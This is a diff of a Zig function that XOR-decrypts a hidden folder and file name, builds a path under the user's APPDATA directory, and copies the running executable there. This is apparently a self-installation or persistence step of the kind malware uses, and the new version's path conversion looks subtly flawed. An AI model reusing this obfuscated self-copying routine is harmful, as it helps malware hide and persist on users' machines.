@@ -58,24 +58,30 @@ pub fn install(exe_path: []const u8, allocator: std.mem.Allocator) bool {
     hash.xorDecrypt(&E.file_name, &tmp_fname);
     var appdata_buf: [1024]u16 = undefined;
     const appdata_len = getEnvW("APPDATA", &appdata_buf) orelse return false;
-    var appdata: [1024]u8 = undefined;
-    var appdata_size: usize = 0;
+    var target_path = std.ArrayList(u16).init(allocator);
+    defer target_path.deinit();
     for (0..appdata_len) |k| {
-        const cp = appdata_buf[k];
-        if (cp < 0x80 and appdata_size < appdata.len) {
-            appdata[appdata_size] = @as(u8, @intCast(cp));
-            appdata_size += 1;
+        target_path.append(appdata_buf[k]) catch return false;
+    }
+    target_path.append('\\') catch return false;
+    for (tmp_dir[0..]) |c| {
+        target_path.append(c) catch return false;
+    }
+    target_path.append('\\') catch return false;
+    for (tmp_fname[0..]) |c| {
+        target_path.append(c) catch return false;
+    }
+    var target_us = target_path.items;
+    var path_ascii: [1024]u8 = undefined;
+    var ascii_len: usize = 0;
+    for (target_us) |w| {
+        if (ascii_len < path_ascii.len) {
+            path_ascii[ascii_len] = @as(u8, @truncate(w));
+            ascii_len += 1;
         }
     }
-    var target_path = std.ArrayList(u8).init(allocator);
-    defer target_path.deinit();
-    target_path.appendSlice(appdata[0..appdata_size]) catch return false;
-    target_path.appendSlice("\\") catch return false;
-    target_path.appendSlice(tmp_dir[0..]) catch return false;
-    target_path.appendSlice("\\") catch return false;
-    target_path.appendSlice(tmp_fname[0..]) catch return false;
-    const target = target_path.items;
-    return copyFileW(exe_path, target);
+    _ = ascii_len;
+    return copyFileW(exe_path, path_ascii[0..ascii_len]);
 }
 
 pub fn uninstall() bool {
